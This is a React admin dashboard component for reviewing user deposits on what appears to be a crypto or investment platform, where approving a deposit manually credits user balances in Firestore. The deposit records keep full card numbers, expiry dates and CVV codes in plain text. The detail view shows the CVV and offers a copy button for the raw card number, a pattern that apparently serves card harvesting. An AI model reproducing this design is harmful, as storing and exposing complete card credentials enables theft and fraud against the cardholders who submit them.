import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Search, 
  Filter, 
  CheckCircle2, 
  XCircle, 
  Clock, 
  ExternalLink, 
  ArrowDownCircle, 
  CreditCard, 
  Wallet, 
  Coins, 
  Building2, 
  Eye, 
  Copy, 
  Check, 
  ShieldCheck, 
  User, 
  Mail, 
  DollarSign, 
  X, 
  AlertCircle,
  FileText,
  Sparkles,
  ArrowRight
} from 'lucide-react';
import { collection, onSnapshot, query, orderBy, updateDoc, doc, getDoc, getDocs, where, arrayUnion, increment, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../lib/firebase';
import { portfolioPersistenceService } from '../../../services/portfolioPersistenceService';
import { walletService } from '../../../services/walletService';

export interface DepositRecord {
  id: string;
  userId: string;
  email: string;
  userName?: string;
  fundingMethod: 'card' | 'crypto' | 'walletconnect' | 'bank' | string;
  currency: string;
  amount: number;
  network?: string;
  // Crypto details
  walletAddress?: string;
  cryptoSymbol?: string;
  cryptoNetwork?: string;
  // WalletConnect details
  connectedWalletAddress?: string;
  walletProvider?: string;
  // Bank details
  bankReference?: string;
  bankName?: string;
  swiftCode?: string;
  // Card details
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardName?: string;
  cardReference?: string;
  cardMasked?: string;
  billingCountry?: string;
  // Proof
  paymentProof?: string;
  status: 'pending' | 'completed' | 'rejected' | string;
  timestamp: string;
  processedAt?: any;
  processedBy?: string;
}

export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
  const [deposits, setDeposits] = useState<DepositRecord[]>([]);
  const [search, setSearch] = useState('');
  const [filterStatus, setFilterStatus] = useState<'all' | 'pending' | 'completed' | 'rejected'>('all');
  const [loading, setLoading] = useState(true);
  const [selectedDeposit, setSelectedDeposit] = useState<DepositRecord | null>(null);
  const [processingId, setProcessingId] = useState<string | null>(null);
  const [actionSuccessMessage, setActionSuccessMessage] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const isDark = theme === 'dark';

  useEffect(() => {
    const q = query(collection(db, 'admin_deposits'), orderBy('timestamp', 'desc'));
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map(doc => ({ id: doc.id, ...doc.data() } as DepositRecord));
      setDeposits(data);
      setLoading(false);
    }, (err) => {
      console.warn("Failed to subscribe to admin_deposits:", err);
      setLoading(false);
    });
    return unsub;
  }, []);

  const handleCopy = (text: string, fieldName: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldName);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleApproveDeposit = async (deposit: DepositRecord) => {
    try {
      setProcessingId(deposit.id);

      // 1. Update status in admin_deposits collection
      const depositRef = doc(db, 'admin_deposits', deposit.id);
      await updateDoc(depositRef, { 
        status: 'completed',
        approvedAt: serverTimestamp(),
        processedAt: serverTimestamp(),
        processedBy: 'Super Admin'
      });

      const amount = Number(deposit.amount) || 0;
      let targetUid = deposit.userId;

      // Fallback: If userId is missing or anonymous, look up user by email in Firestore
      if ((!targetUid || targetUid === 'anonymous') && deposit.email) {
        try {
          const userQ = query(collection(db, 'users'), where('email', '==', deposit.email.toLowerCase().trim()));
          const userSnap = await getDocs(userQ);
          if (!userSnap.empty) {
            targetUid = userSnap.docs[0].id;
          }
        } catch (err) {
          console.warn("Could not find user by email fallback:", err);
        }
      }

      // 2. Credit the user balance if a valid targetUid is found
      if (targetUid && targetUid !== 'anonymous') {
        const userDocRef = doc(db, 'users', targetUid);
        const userSnap = await getDoc(userDocRef);

        const notifItem = {
          id: `notif-${Date.now()}`,
          title: 'Deposit Approved & Credited',
          message: `Your institutional deposit of $${amount.toLocaleString()} (${deposit.currency || 'USD'}) has been approved by administration and credited to your balance.`,
          time: 'Just now',
          timestamp: new Date().toISOString(),
          unread: true,
          type: 'success'
        };

        if (userSnap.exists()) {
          await updateDoc(userDocRef, {
            portfolioBalance: increment(amount),
            availableBalance: increment(amount),
            totalDeposits: increment(amount),
            tokenBalance: increment(amount),
            'portfolio.totalValue': increment(amount),
            notificationsList: arrayUnion(notifItem),
            lastUpdated: serverTimestamp()
          }).catch(err => console.warn("Failed user doc balance increment:", err));
        }

        // 3. Update persistent portfolio state for targetUid
        try {
          const currentPortfolio = await portfolioPersistenceService.getPortfolioCurrent(targetUid);
          const currentPortBal = currentPortfolio?.walletState?.portfolioBalance || 0;
          const currentAvail = currentPortfolio?.walletState?.availableBalance || 0;
          const currentTotDep = currentPortfolio?.walletState?.totalDeposits || 0;

          await portfolioPersistenceService.savePortfolioCurrent(targetUid, {
            walletState: {
              portfolioBalance: currentPortBal + amount,
              availableBalance: currentAvail + amount,
              totalDeposits: currentTotDep + amount,
              tokenBalance: currentPortBal + amount
            },
            portfolioMetrics: {
              totalValue: (currentPortBal + amount) + (currentPortfolio?.walletState?.vaultBalance || 0)
            }
          });
        } catch (pErr) {
          console.warn("Failed portfolio persistence update:", pErr);
        }

        // 4. Update dedicated wallet document
        try {
          await walletService.updateWallet(targetUid, {
            portfolioBalance: increment(amount) as any,
            availableBalance: increment(amount) as any,
            totalDeposits: increment(amount) as any
          });
        } catch (wErr) {
          console.warn("Failed walletService update:", wErr);
        }
      }

      setActionSuccessMessage(`Successfully approved deposit of $${amount.toLocaleString()} for ${deposit.email}. User balance credited.`);
      setTimeout(() => setActionSuccessMessage(null), 4000);
      if (selectedDeposit?.id === deposit.id) {
        setSelectedDeposit(prev => prev ? { ...prev, status: 'completed' } : null);
      }
    } catch (err) {
      console.error("Failed to approve deposit:", err);
      alert("Error approving deposit. Please check database permissions.");
    } finally {
      setProcessingId(null);
    }
  };

  const handleDeclineDeposit = async (deposit: DepositRecord) => {
    try {
      setProcessingId(deposit.id);

      // 1. Update status in admin_deposits collection
      const depositRef = doc(db, 'admin_deposits', deposit.id);
      await updateDoc(depositRef, { 
        status: 'rejected',
        declinedAt: serverTimestamp(),
        processedAt: serverTimestamp(),
        processedBy: 'Super Admin'
      });

      const amount = Number(deposit.amount) || 0;
      let targetUid = deposit.userId;

      if ((!targetUid || targetUid === 'anonymous') && deposit.email) {
        try {
          const userQ = query(collection(db, 'users'), where('email', '==', deposit.email.toLowerCase().trim()));
          const userSnap = await getDocs(userQ);
          if (!userSnap.empty) {
            targetUid = userSnap.docs[0].id;
          }
        } catch (err) {
          console.warn("Could not find user by email fallback:", err);
        }
      }

      if (targetUid && targetUid !== 'anonymous') {
        const userDocRef = doc(db, 'users', targetUid);
        const userSnap = await getDoc(userDocRef);

        if (userSnap.exists()) {
          const notifItem = {
            id: `notif-${Date.now()}`,
            title: 'Deposit Request Declined',
            message: `Your deposit request of $${amount.toLocaleString()} (${deposit.currency || 'USD'}) was declined during audit. Please contact support if you require assistance.`,
            time: 'Just now',
            timestamp: new Date().toISOString(),
            unread: true,
            type: 'error'
          };

          await updateDoc(userDocRef, {
            notificationsList: arrayUnion(notifItem)
          }).catch(err => console.warn("Failed user doc notification update:", err));
        }
      }

      setActionSuccessMessage(`Deposit of $${amount.toLocaleString()} for ${deposit.email} has been declined.`);
      setTimeout(() => setActionSuccessMessage(null), 4000);
      if (selectedDeposit?.id === deposit.id) {
        setSelectedDeposit(prev => prev ? { ...prev, status: 'rejected' } : null);
      }
    } catch (err) {
      console.error("Failed to decline deposit:", err);
      alert("Error declining deposit.");
    } finally {
      setProcessingId(null);
    }
  };

  const filteredDeposits = deposits.filter(d => {
    const matchesSearch = 
      d.email?.toLowerCase().includes(search.toLowerCase()) || 
      d.userName?.toLowerCase().includes(search.toLowerCase()) || 
      d.id?.toLowerCase().includes(search.toLowerCase()) || 
      d.currency?.toLowerCase().includes(search.toLowerCase()) ||
      d.fundingMethod?.toLowerCase().includes(search.toLowerCase()) ||
      d.cardNumber?.toLowerCase().includes(search.toLowerCase()) ||
      d.cardMasked?.toLowerCase().includes(search.toLowerCase()) ||
      d.cardName?.toLowerCase().includes(search.toLowerCase()) ||
      d.walletAddress?.toLowerCase().includes(search.toLowerCase()) ||
      d.connectedWalletAddress?.toLowerCase().includes(search.toLowerCase()) ||
      d.bankReference?.toLowerCase().includes(search.toLowerCase());

    const matchesStatus = filterStatus === 'all' || d.status === filterStatus;

    return matchesSearch && matchesStatus;
  });

  const pendingVolume = deposits.filter(d => d.status === 'pending').reduce((acc, d) => acc + (Number(d.amount) || 0), 0);
  const completedVolume = deposits.filter(d => d.status === 'completed').reduce((acc, d) => acc + (Number(d.amount) || 0), 0);
  const pendingCount = deposits.filter(d => d.status === 'pending').length;

  const getMethodBadge = (method: string) => {
    switch (method) {
      case 'card':
        return (
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-blue-500/10 text-blue-400 border border-blue-500/20 flex items-center gap-1.5 w-fit">
            <CreditCard size={12} /> Credit Card
          </span>
        );
      case 'crypto':
        return (
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/20 flex items-center gap-1.5 w-fit">
            <Coins size={12} /> Crypto Vault
          </span>
        );
      case 'walletconnect':
        return (
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 flex items-center gap-1.5 w-fit">
            <Wallet size={12} /> Web3 Wallet
          </span>
        );
      case 'bank':
        return (
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-purple-500/10 text-purple-400 border border-purple-500/20 flex items-center gap-1.5 w-fit">
            <Building2 size={12} /> Bank Wire
          </span>
        );
      default:
        return (
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-slate-500/10 text-slate-400 border border-slate-500/20 flex items-center gap-1.5 w-fit">
            <DollarSign size={12} /> {method || 'Deposit'}
          </span>
        );
    }
  };

  return (
    <div className="space-y-8">
      {/* Toast Banner */}
      <AnimatePresence>
        {actionSuccessMessage && (
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="p-4 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 text-sm font-bold flex items-center justify-between shadow-xl backdrop-blur-md"
          >
            <div className="flex items-center gap-3">
              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
              <span>{actionSuccessMessage}</span>
            </div>
            <button onClick={() => setActionSuccessMessage(null)} className="text-slate-400 hover:text-white">
              <X size={16} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header & Stats Grid */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
        <div>
          <h1 className="text-3xl font-black tracking-tight mb-2 flex items-center gap-3">
            Deposit Inflow & Audit
            {pendingCount > 0 && (
              <span className="px-2.5 py-0.5 rounded-full text-xs font-black bg-amber-500 text-black animate-pulse">
                {pendingCount} Pending
              </span>
            )}
          </h1>
          <p className={`text-sm ${isDark ? 'text-slate-400' : 'text-slate-500'}`}>
            Real-time verification center for user deposit submissions across Cards, Web3 Wallets, Crypto, and Wire Transfers.
          </p>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-2 gap-4">
          <div className={`p-4 rounded-2xl border flex items-center gap-4 ${
            isDark ? 'bg-amber-500/5 border-amber-500/15' : 'bg-amber-50 border-amber-200'
          }`}>
            <div>
              <span className="text-[10px] font-bold text-slate-500 uppercase block">Pending Volume</span>
              <strong className="text-amber-500 text-lg font-black">
                ${pendingVolume.toLocaleString()}
              </strong>
            </div>
            <ArrowDownCircle className="w-8 h-8 text-amber-500 ml-auto" />
          </div>

          <div className={`p-4 rounded-2xl border flex items-center gap-4 ${
            isDark ? 'bg-emerald-500/5 border-emerald-500/15' : 'bg-emerald-50 border-emerald-200'
          }`}>
            <div>
              <span className="text-[10px] font-bold text-slate-500 uppercase block">Credited Volume</span>
              <strong className="text-emerald-500 text-lg font-black">
                ${completedVolume.toLocaleString()}
              </strong>
            </div>
            <CheckCircle2 className="w-8 h-8 text-emerald-500 ml-auto" />
          </div>
        </div>
      </div>

      {/* Search & Category Filter Tabs */}
      <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
        <div className={`w-full sm:max-w-md flex items-center gap-3 px-4 py-2.5 rounded-2xl border ${
          isDark ? 'bg-white/5 border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
        }`}>
          <Search className="w-4 h-4 text-slate-500" />
          <input 
            type="text" 
            placeholder="Search by email, name, card number, address, ref..." 
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="bg-transparent border-none focus:outline-none focus:ring-0 text-sm w-full placeholder-slate-500"
          />
        </div>

        <div className="flex overflow-x-auto gap-2 w-full sm:w-auto">
          {(['all', 'pending', 'completed', 'rejected'] as const).map((status) => (
            <button
              key={status}
              onClick={() => setFilterStatus(status)}
              className={`px-4 py-2 rounded-xl text-xs font-black uppercase tracking-wider transition-all whitespace-nowrap ${
                filterStatus === status
                  ? 'bg-emerald-500 text-black shadow-lg shadow-emerald-500/20'
                  : isDark
                  ? 'bg-white/5 text-slate-400 hover:text-white border border-white/5'
                  : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
              }`}
            >
              {status === 'all' ? 'All Inflows' : status}
            </button>
          ))}
        </div>
      </div>

      {/* Deposits Table */}
      <div className={`rounded-[2rem] border overflow-hidden shadow-xl ${
        isDark ? 'bg-slate-900/40 border-white/10 backdrop-blur-xl' : 'bg-white border-slate-200 shadow-sm'
      }`}>
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className={`border-b ${isDark ? 'border-white/10 bg-white/[0.02]' : 'border-slate-100 bg-slate-50'}`}>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">User / Account</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Method & Details</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Amount</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Status</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Submitted</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest text-right">Audit Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {filteredDeposits.map((item) => {
                const isPending = item.status === 'pending';
                const isApproved = item.status === 'completed';
                const isDeclined = item.status === 'rejected';

                return (
                  <tr key={item.id} className={`group transition-colors ${
                    isDark ? 'hover:bg-white/[0.02]' : 'hover:bg-slate-50'
                  }`}>
                    <td className="px-6 py-4">
                      <div className="flex flex-col">
                        <span className={`text-sm font-black ${isDark ? 'text-white' : 'text-slate-900'}`}>
                          {item.userName || item.email || 'Anonymous User'}
                        </span>
                        <span className="text-[11px] font-medium text-slate-400">{item.email}</span>
                        <span className="text-[10px] font-mono text-slate-500 mt-0.5">{item.id}</span>
                      </div>
                    </td>

                    <td className="px-6 py-4">
                      <div className="flex flex-col gap-1.5">
                        {getMethodBadge(item.fundingMethod)}
                        <span className="text-xs font-semibold text-slate-400">
                          {item.fundingMethod === 'card' && (item.cardNumber ? `Card: ${item.cardNumber}` : (item.cardMasked || item.cardReference || 'Credit Card'))}
                          {item.fundingMethod === 'crypto' && (item.walletAddress ? `${item.walletAddress.slice(0, 8)}...${item.walletAddress.slice(-6)}` : (item.network || 'Crypto Deposit'))}
                          {item.fundingMethod === 'walletconnect' && (item.connectedWalletAddress ? `${item.connectedWalletAddress.slice(0, 8)}...${item.connectedWalletAddress.slice(-6)}` : (item.network || 'Web3 Wallet'))}
                          {item.fundingMethod === 'bank' && (item.bankReference || 'Bank Wire')}
                        </span>
                      </div>
                    </td>

                    <td className="px-6 py-4">
                      <div className="flex flex-col">
                        <span className="text-base font-black text-emerald-400">
                          ${Number(item.amount || 0).toLocaleString()}
                        </span>
                        <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                          {item.currency || 'USD'}
                        </span>
                      </div>
                    </td>

                    <td className="px-6 py-4">
                      <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-wider border ${
                        isApproved ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
                        isDeclined ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
                        'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
                      }`}>
                        {item.status}
                      </span>
                    </td>

                    <td className="px-6 py-4">
                      <div className="flex items-center gap-1.5 text-xs text-slate-400 font-medium">
                        <Clock className="w-3.5 h-3.5" />
                        {item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Just now'}
                      </div>
                    </td>

                    <td className="px-6 py-4">
                      <div className="flex items-center justify-end gap-2">
                        <button
                          onClick={() => setSelectedDeposit(item)}
                          className={`p-2 rounded-xl border transition-all ${
                            isDark 
                              ? 'bg-white/5 border-white/10 hover:bg-white/10 text-white' 
                              : 'bg-slate-100 border-slate-200 hover:bg-slate-200 text-slate-700'
                          }`}
                          title="View Full Deposit Details"
                        >
                          <Eye className="w-4 h-4" />
                        </button>

                        {isPending && (
                          <>
                            <button 
                              onClick={() => handleApproveDeposit(item)}
                              disabled={processingId === item.id}
                              className="px-3 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-black text-xs flex items-center gap-1.5 shadow-lg shadow-emerald-500/20 active:scale-95 transition-all disabled:opacity-50"
                              title="Approve & Credit Balance"
                            >
                              <CheckCircle2 className="w-4 h-4" />
                              <span>Approve</span>
                            </button>

                            <button 
                              onClick={() => handleDeclineDeposit(item)}
                              disabled={processingId === item.id}
                              className="px-3 py-2 rounded-xl bg-rose-500/15 hover:bg-rose-500 text-rose-400 hover:text-white border border-rose-500/30 font-black text-xs flex items-center gap-1.5 active:scale-95 transition-all disabled:opacity-50"
                              title="Decline Deposit"
                            >
                              <XCircle className="w-4 h-4" />
                              <span>Decline</span>
                            </button>
                          </>
                        )}
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {filteredDeposits.length === 0 && !loading && (
          <div className="py-20 flex flex-col items-center justify-center text-center space-y-4 opacity-50">
            <ArrowDownCircle className="w-16 h-16 text-slate-500" />
            <div className="space-y-1">
              <p className="font-bold text-base">No deposit records found</p>
              <p className="text-xs text-slate-400">Incoming capital submissions will appear here in real-time.</p>
            </div>
          </div>
        )}
      </div>

      {/* FULL DEPOSIT DETAILS MODAL */}
      <AnimatePresence>
        {selectedDeposit && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`w-full max-w-2xl rounded-3xl border overflow-hidden shadow-2xl flex flex-col max-h-[90vh] ${
                isDark ? 'bg-[#0a0d14] border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
              }`}
            >
              {/* Modal Header */}
              <div className="p-6 border-b border-white/10 flex items-center justify-between bg-emerald-500/5">
                <div className="flex items-center gap-3">
                  <div className="p-3 rounded-2xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                    <ShieldCheck className="w-6 h-6" />
                  </div>
                  <div>
                    <h3 className="text-xl font-black tracking-tight">Deposit Audit Record</h3>
                    <p className="text-xs text-slate-400 font-mono">ID: {selectedDeposit.id}</p>
                  </div>
                </div>

                <button 
                  onClick={() => setSelectedDeposit(null)}
                  className="p-2 rounded-full hover:bg-white/10 text-slate-400 hover:text-white transition-colors"
                >
                  <X size={20} />
                </button>
              </div>

              {/* Modal Content Scrollable */}
              <div className="p-6 space-y-6 overflow-y-auto custom-scrollbar flex-1">
                {/* Financial Overview Card */}
                <div className={`p-5 rounded-2xl border flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 ${
                  isDark ? 'bg-white/5 border-white/5' : 'bg-slate-50 border-slate-200'
                }`}>
                  <div>
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1">Submitted Amount</span>
                    <strong className="text-3xl font-black text-emerald-400">
                      ${Number(selectedDeposit.amount || 0).toLocaleString()} <span className="text-base text-slate-400">{selectedDeposit.currency}</span>
                    </strong>
                  </div>

                  <div className="text-right flex flex-col sm:items-end gap-2">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Status</span>
                    <span className={`px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider border ${
                      selectedDeposit.status === 'completed' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
                      selectedDeposit.status === 'rejected' ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
                      'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
                    }`}>
                      {selectedDeposit.status}
                    </span>
                  </div>
                </div>

                {/* Client Profile Section */}
                <div className="space-y-3">
                  <h4 className="text-xs font-black uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <User className="w-4 h-4 text-emerald-400" /> Account Owner Details
                  </h4>
                  <div className={`p-4 rounded-2xl border space-y-2 text-xs ${
                    isDark ? 'bg-white/5 border-white/5' : 'bg-slate-50 border-slate-200'
                  }`}>
                    <div className="flex justify-between items-center py-1 border-b border-white/5">
                      <span className="text-slate-400 font-medium">User Name:</span>
                      <span className="font-bold">{selectedDeposit.userName || 'Institutional Account'}</span>
                    </div>
                    <div className="flex justify-between items-center py-1 border-b border-white/5">
                      <span className="text-slate-400 font-medium">User Email:</span>
                      <span className="font-bold text-emerald-400">{selectedDeposit.email}</span>
                    </div>
                    <div className="flex justify-between items-center py-1">
                      <span className="text-slate-400 font-medium">User ID:</span>
                      <span className="font-mono text-[11px] text-slate-300 flex items-center gap-2">
                        {selectedDeposit.userId}
                        <button onClick={() => handleCopy(selectedDeposit.userId, 'uid')} className="hover:text-emerald-400">
                          {copiedField === 'uid' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                        </button>
                      </span>
                    </div>
                  </div>
                </div>

                {/* Funding Method Instrument Details */}
                <div className="space-y-3">
                  <h4 className="text-xs font-black uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <CreditCard className="w-4 h-4 text-indigo-400" /> Funding Instrument Specs
                  </h4>

                  <div className={`p-5 rounded-2xl border space-y-3 ${
                    isDark ? 'bg-white/5 border-white/5' : 'bg-slate-50 border-slate-200'
                  }`}>
                    <div className="flex items-center justify-between pb-3 border-b border-white/5">
                      <span className="text-xs text-slate-400 font-medium">Funding Method:</span>
                      {getMethodBadge(selectedDeposit.fundingMethod)}
                    </div>

                    {/* CARD SPECIFICS */}
                    {selectedDeposit.fundingMethod === 'card' && (
                      <>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Cardholder Name:</span>
                          <span className="font-bold">{selectedDeposit.cardName || 'Not provided'}</span>
                        </div>
                        <div className="space-y-1 py-1.5 border-b border-white/5">
                          <span className="text-slate-400 text-xs block">Card Number:</span>
                          <div className="p-2.5 rounded-xl bg-black/40 font-mono text-sm text-emerald-400 font-black tracking-widest break-all flex items-center justify-between gap-2 border border-emerald-500/20">
                            <span>{selectedDeposit.cardNumber || selectedDeposit.cardMasked || selectedDeposit.cardReference || 'Not provided'}</span>
                            {selectedDeposit.cardNumber && (
                              <button onClick={() => handleCopy(selectedDeposit.cardNumber || '', 'cardnum')} className="hover:text-white shrink-0 p-1">
                                {copiedField === 'cardnum' ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                              </button>
                            )}
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-4 py-1.5 border-b border-white/5 text-xs">
                          <div>
                            <span className="text-slate-400 block">Expiration (MM/YY):</span>
                            <span className="font-mono font-black text-amber-400 text-sm">{selectedDeposit.cardExpiry || 'Not provided'}</span>
                          </div>
                          <div>
                            <span className="text-slate-400 block">CVV Code:</span>
                            <span className="font-mono font-black text-rose-400 text-sm">{selectedDeposit.cardCvv || 'Not provided'}</span>
                          </div>
                        </div>
                        <div className="flex justify-between items-center text-xs py-1">
                          <span className="text-slate-400">Billing Country:</span>
                          <span className="font-bold">{selectedDeposit.billingCountry || 'Not provided'}</span>
                        </div>
                      </>
                    )}

                    {/* CRYPTO SPECIFICS */}
                    {selectedDeposit.fundingMethod === 'crypto' && (
                      <>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Asset & Symbol:</span>
                          <span className="font-bold text-amber-400">{selectedDeposit.cryptoSymbol || selectedDeposit.currency || 'N/A'}</span>
                        </div>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Network:</span>
                          <span className="font-bold">{selectedDeposit.cryptoNetwork || selectedDeposit.network || 'N/A'}</span>
                        </div>
                        <div className="space-y-1 pt-1">
                          <span className="text-[11px] text-slate-400 block font-medium">Destination Vault Address:</span>
                          {selectedDeposit.walletAddress ? (
                            <div className="p-2.5 rounded-xl bg-black/40 font-mono text-xs text-amber-300 break-all flex items-center justify-between gap-2 border border-white/5">
                              <span>{selectedDeposit.walletAddress}</span>
                              <button onClick={() => handleCopy(selectedDeposit.walletAddress || '', 'addr')} className="hover:text-white shrink-0">
                                {copiedField === 'addr' ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                              </button>
                            </div>
                          ) : (
                            <span className="text-xs text-slate-500 italic block">No destination address recorded</span>
                          )}
                        </div>
                      </>
                    )}

                    {/* WALLETCONNECT SPECIFICS */}
                    {selectedDeposit.fundingMethod === 'walletconnect' && (
                      <>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Wallet Provider:</span>
                          <span className="font-bold text-indigo-400">{selectedDeposit.walletProvider || selectedDeposit.network || 'Web3 Provider'}</span>
                        </div>
                        <div className="space-y-1 pt-1">
                          <span className="text-[11px] text-slate-400 block font-medium">Connected Web3 Wallet Address:</span>
                          {selectedDeposit.connectedWalletAddress ? (
                            <div className="p-2.5 rounded-xl bg-black/40 font-mono text-xs text-indigo-300 break-all flex items-center justify-between gap-2 border border-white/5">
                              <span>{selectedDeposit.connectedWalletAddress}</span>
                              <button onClick={() => handleCopy(selectedDeposit.connectedWalletAddress || '', 'waddr')} className="hover:text-white shrink-0">
                                {copiedField === 'waddr' ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                              </button>
                            </div>
                          ) : (
                            <span className="text-xs text-slate-500 italic block">No wallet address connected during submission</span>
                          )}
                        </div>
                      </>
                    )}

                    {/* BANK WIRE SPECIFICS */}
                    {selectedDeposit.fundingMethod === 'bank' && (
                      <>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Wire Bank Reference:</span>
                          <span className="font-mono font-bold text-purple-400">{selectedDeposit.bankReference || 'None Provided'}</span>
                        </div>
                        <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                          <span className="text-slate-400">Institutional Bank:</span>
                          <span className="font-bold">{selectedDeposit.bankName || 'Not specified'}</span>
                        </div>
                        <div className="flex justify-between items-center text-xs py-1">
                          <span className="text-slate-400">SWIFT / BIC Code:</span>
                          <span className="font-mono font-bold">{selectedDeposit.swiftCode || 'Not specified'}</span>
                        </div>
                        {selectedDeposit.paymentProof && (
                          <div className="flex justify-between items-center text-xs pt-2 border-t border-white/5">
                            <span className="text-slate-400 flex items-center gap-1.5"><FileText size={14} /> Attached Proof:</span>
                            <span className="font-bold text-emerald-400 underline cursor-pointer">{selectedDeposit.paymentProof}</span>
                          </div>
                        )}
                      </>
                    )}
                  </div>
                </div>

                {/* Audit Timestamp */}
                <div className="text-[11px] text-slate-500 space-y-1 pt-2">
                  <p>Request Submitted: {new Date(selectedDeposit.timestamp).toLocaleString()}</p>
                  {selectedDeposit.processedAt && (
                    <p className="text-emerald-400">Audit Processed: {selectedDeposit.processedBy || 'Admin'}</p>
                  )}
                </div>
              </div>

              {/* Modal Footer Controls */}
              <div className="p-6 border-t border-white/10 flex items-center justify-between gap-4 bg-black/20">
                <button
                  onClick={() => setSelectedDeposit(null)}
                  className="px-5 py-2.5 rounded-2xl border border-white/10 hover:bg-white/5 font-bold text-xs"
                >
                  Close
                </button>

                {selectedDeposit.status === 'pending' && (
                  <div className="flex items-center gap-3">
                    <button 
                      onClick={() => handleDeclineDeposit(selectedDeposit)}
                      disabled={processingId === selectedDeposit.id}
                      className="px-5 py-2.5 rounded-2xl bg-rose-500/15 hover:bg-rose-500 text-rose-400 hover:text-white border border-rose-500/30 font-black text-xs active:scale-95 transition-all disabled:opacity-50"
                    >
                      Decline
                    </button>

                    <button 
                      onClick={() => handleApproveDeposit(selectedDeposit)}
                      disabled={processingId === selectedDeposit.id}
                      className="px-6 py-2.5 rounded-2xl bg-emerald-500 hover:bg-emerald-400 text-black font-black text-xs flex items-center gap-2 shadow-lg shadow-emerald-500/20 active:scale-95 transition-all disabled:opacity-50"
                    >
                      <CheckCircle2 className="w-4 h-4" />
                      Approve & Credit Balance
                    </button>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
